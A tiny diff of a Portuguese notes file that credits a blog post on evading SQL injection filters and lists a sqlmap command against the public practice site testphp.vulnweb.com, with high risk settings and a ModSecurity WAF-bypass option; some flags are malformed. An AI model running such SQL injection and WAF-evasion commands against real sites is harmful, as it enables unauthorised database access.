@@ -2,7 +2,7 @@ Creditos:
 http://www.nanoshots.com.br/2016/03/sqlmap-bypass-das-regras-de-sql.html
 
 
-<!-- Lista os DB-->
+<!--Lista os DB-->
 sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -level 3 --risk 3  -v4 --dbms "MySQL" --random -agent waf "modsecurity.py" 
 
 <!-- Lista os DB-->
